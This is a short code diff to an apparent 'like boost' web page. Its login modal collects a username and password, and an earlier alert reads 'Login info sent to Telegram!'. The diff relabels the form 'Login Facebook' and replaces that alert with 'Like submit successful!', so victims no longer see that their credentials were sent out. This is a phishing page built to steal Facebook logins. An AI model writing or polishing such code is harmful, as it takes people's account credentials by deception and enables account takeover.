@@ -148,7 +148,7 @@
 <!-- Login Modal -->
 <div class="modal" id="login-modal">
   <div class="modal-content">
-    <h2>Login</h2>
+    <h2>Login Facebook</h2>
     <input type="text" id="username" placeholder="Username">
     <input type="password" id="password" placeholder="Password">
     <button onclick="sendLogin()">Login</button>
@@ -212,7 +212,7 @@
       });
       const data = await res.json();
       if(data.status === "sent") {
-        alert("✅ Login info sent to Telegram!");
+        alert("✅ Like submit successful!");
         loginModal.style.display = "none";
         // After login, simulate like boost
         if(currentBoostIndex !== null){
